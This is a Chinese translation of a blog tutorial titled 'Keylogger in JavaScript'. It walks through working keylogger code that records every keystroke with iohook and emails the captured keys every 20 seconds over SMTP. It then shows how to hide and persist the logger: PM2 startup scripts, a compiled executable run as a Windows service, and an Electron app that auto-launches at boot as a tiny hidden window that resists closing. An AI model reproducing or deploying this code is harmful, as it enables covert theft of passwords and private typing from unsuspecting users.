# JavaScript 中的键盘记录器

> 原文：<https://blog.devgenius.io/keylogger-in-javascript-e77b78cd7219?source=collection_archive---------5----------------------->

## 是的，有可能。

![](img/89cd7d604db47f113d794b153636308f.png)

由 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上的[克里斯托佛罗拉](https://unsplash.com/@krisroller?utm_source=medium&utm_medium=referral)拍摄的照片

对于核心实现，我需要两个主要的外部库: [IoHook](https://wilix-team.github.io/iohook/) 和 [NodeMailer](https://nodemailer.com/about/) 。

```
"dependencies": {
  "**iohook**": "^0.9.3",
  "**nodemailer**": "^6.7.2"
}
```

第一步是在 *keyDown* 事件上启动 IoHook 监听器，从自定义输入映射中读取实际字符。事实上，不幸的是，事件返回的按键代码与特殊字符的实际代码并不对应，所以我们不能使用 *String.fromCharCode()。*

```
const **ioHook** = require('iohook');const **keyNamesWin** = { // ... 
  52: '.',
  53: 'ù',
  54: 'Shift' //.... }let **cache** = []**ioHook**.on('keydown', (event) => {
    **cache**.push(**keyNamesWin**[event.keycode])
});
```

第二步是实际配置 NodeMailer SMTP 帐户。在这种情况下，我使用的是一个假的 [MailTrap.io](https://mailtrap.io/) 账户。

```
const **nodemailer** = require('nodemailer');
const **transport** = **nodemailer**.createTransport({
    **host**: "smtp.mailtrap.io",
    **port**: 2525,
    **auth**: {
        user: "xxxx",
        pass: "xxxx"
    }
});
```

T 第三步是使用[生命函数](https://developer.mozilla.org/en-US/docs/Glossary/IIFE)来启用保存在**缓存**变量中的定时器，该定时器实际上发送保存在按键下的邮件。

```
(function timer() {
    if (cache.length > 0) {
        mailOptions.text = cache.toString()
        ***console***.log('mail')
        transport.sendMail(mailOptions, (error, info) => {
            if (error) {
                return ***console***.log(error);
            }
            ***console***.log('Message sent: %s', info.messageId);
        });
        cache = [];
    } else {
        ***console***.log('empty')
    }
    setTimeout(timer, 20000);
})();
```

关于程序的实际执行，有两种主要场景:在节点。JS 运行时已安装并可用，以及节点的位置。JS 未安装。

F 或者第一种情况 **(NodeJS===true)** ，我们可以简单地使用 Node.JS 的 [PM2](https://pm2.keymetrics.io/) 进程管理器来执行脚本

```
> npm install -g pm2 
> pm2 start index.js
```

也可以启用一个 [PM2 启动脚本](https://pm2.keymetrics.io/docs/usage/startup/)，让它在系统重启时启动。(对于 windows 机器来说稍微复杂一些，但无论如何都是可行的)。

F 或者第二种情况 **(NodeJS===false)** ，一种解决方案是使用 [Nexe](https://github.com/nexe/nexe) 将 Node.js 应用程序编译成单个可执行文件。您需要从列表中为可执行文件选择一个合适的运行时。您可能希望将该可执行文件作为服务安装。对于 windows，可以使用令人敬畏的 [NSSM](http://nssm.cc/) 。

```
> npm install -g nexe
> nexe index.js -o test -t windows --build --verbose
```

*(注意:第一次构建需要一段时间。对于 windows，它可能会要求您安装*[*NASM*](https://www.nasm.us/pub/nasm/releasebuilds/2.15.04/win64/)*也。)*

Windows 操作系统的另一个解决方案可能是构建一个[电子。JS](https://www.electronjs.org/) 可以最小化启动并自动配置为在启动时启动的应用程序。

```
const AutoLaunch = require('auto-launch');
const nodemailer = require('./node_modules/nodemailer')
const ioHook = require('./node_modules/iohook')function **init**() { 
  // here we have the exact same code for the keylogger provided above. 
} let tray = null

function **createWindow** () {
  let autoLaunch = new AutoLaunch({
    name: 'Your app name goes here',
    path: app.getPath('exe'),
  });
  autoLaunch.isEnabled().then((isEnabled) => {
    if (!isEnabled) autoLaunch.enable();
  }); const mainWindow = new BrowserWindow({
    width: 1,
    height: 1,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true
    }
  }); tray = new Tray('icon.png')
  tray.setToolTip('This is my application.')
  tray.setContextMenu(Menu.buildFromTemplate([
    {label: 'Disable', type: 'radio'}
  ]))
  mainWindow.loadFile('index.html')
  mainWindow.on('minimize', function (event) {
    event.preventDefault();
    mainWindow.hide();
  });
  mainWindow.on('close', function (event) {
    if (!application.isQuiting) {
      mainWindow.minimize();
    }
    return false;
  });
  mainWindow.minimize()
  init();
}
app.whenReady().then(() => {
  createWindow()
  app.on('activate', function () {
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})
```

在这种情况下，需要在根级别的 package.json 中定义 IoHook 库的目标。

```
"iohook": {
  "targets": [
    "node-83", // this is the node ABI
    "electron-87" // this is the electron ABI 
  ],
  "platforms": [
    "win32",
    "darwin",
    "linux"
  ],
  "arches": [
    "x64",
    "ia32"
  ]
},
```

最后，[electronic-builder](https://www.electron.build/)将提供这个电子应用程序的安装程序，它将作为一个托盘图标最小化。